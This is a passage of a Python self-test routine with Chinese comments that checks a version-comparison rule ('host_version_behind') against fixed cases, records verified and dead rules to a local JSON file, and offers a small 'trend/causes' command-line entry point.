    #    ① **宿主超前**（host > pkg）**不许响** —— 原判据只查 `!=`，这种情况会把方向说反；
    #    ② **面没取到**（一侧为空）**不许响**，但要标 absent（"未生效" ≠ "一致"）；
    #    而**两侧都在、只是读不出数字** ⇒ **必须响**（未知不许当通过）。
    try:
        _hb = quick_scan_mod.host_version_behind
        _b1 = _hb({"pkg_version": "1.2.0", "host_version": "1.1.0"})   # 落后 ⇒ 响
        _b2 = _hb({"pkg_version": "1.1.0", "host_version": "1.2.0"})   # 超前 ⇒ 不响 + ahead
        _b3 = _hb({"pkg_version": "1.2.0", "host_version": "1.2.0"})   # 相同 ⇒ 不响
        _b4 = _hb({"pkg_version": None, "host_version": "1.2.0"})      # 面没取到 ⇒ 不响 + absent
        _b5 = _hb({"pkg_version": "vX", "host_version": "1.2.0"})      # 读不出数字 ⇒ 响
        _bad5 = []
        if not _b1["fire"]:
            _bad5.append("🔴 宿主落后却没响")
        if _b2["fire"]:
            _bad5.append("🔴 宿主**超前**竟响了（原判据就是这么把方向说反的）")
        if not _b2.get("ahead"):
            _bad5.append("🔴 超前时未标 ahead（那这件事就看不见了）")
        if _b3["fire"] or _b3.get("ahead"):
            _bad5.append("🔴 版本相同却报了什么")
        if _b4["fire"] or not _b4.get("absent"):
            _bad5.append("🔴 面没取到时判决不对（应：不响 + absent）")
        if not _b5["fire"]:
            _bad5.append("🔴 读不出数字却没响（未知被当通过了）")
        if _bad5:
            checks.append({"rule": "宿主版本判据 host_version_behind（真身）",
                           "expect": ["HOST_VERSION_BEHIND"], "hit": [],
                           "miss": ["HOST_VERSION_BEHIND"], "ok": False,
                           "detail": "；".join(_bad5)})
        else:
            rec("宿主版本判据 host_version_behind（真身）", ["HOST_VERSION_BEHIND"],
                {"HOST_VERSION_BEHIND"},
                "落后⇒响 · **超前⇒不响且标 ahead（方向不再说反）** · 相同⇒不响 · "
                "面没取到⇒不响且标 absent · 读不出数字⇒响")
    except Exception as _e:
        rec("宿主版本判据 host_version_behind（真身）", ["HOST_VERSION_BEHIND"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    dead = [c["rule"] for c in checks if not c["ok"]]
    missing = sorted({m for c in checks for m in c["miss"]})
    # 把"自检验证过会响"的判据码落盘 —— discover 用它把休眠与可疑分开
    verified = sorted({code for c in checks for code in c.get("hit", [])})
    try:
        (outdir / "selftest.json").write_text(json.dumps(
            {"at": time.strftime("%Y-%m-%dT%H:%M:%S"), "verified_rules": verified,
             "dead_rules": missing, "fixture_dir": str(fx)},
            ensure_ascii=False, indent=1), encoding="utf-8")
    except OSError:
        pass
    return {"fixture_dir": str(fx), "checks": checks,
            "checks_total": len(checks), "dead_checks": dead,
            "dead_rules": missing, "verified_rules": verified,
            "ok": not dead,
            "note": ("负对照没响 = 判据是死的（或夹具没造对）。"
                     "死判据必须修，或从『已覆盖』里划掉 —— 不许留着当覆盖数。")}


if __name__ == "__main__":
    import sys
    od = Path(os.environ.get("TEMP", "/tmp")) / "gbt-quickscan"
    if len(sys.argv) > 1 and sys.argv[1] == "trend":
        print(json.dumps(trend(od), ensure_ascii=False, indent=1))
    elif len(sys.argv) > 1 and sys.argv[1] == "causes":
        print(json.dumps(load_causes(), ensure_ascii=False, indent=1)[:4000])
    else:
        print("usage: quickscan_evolve.py trend|causes")
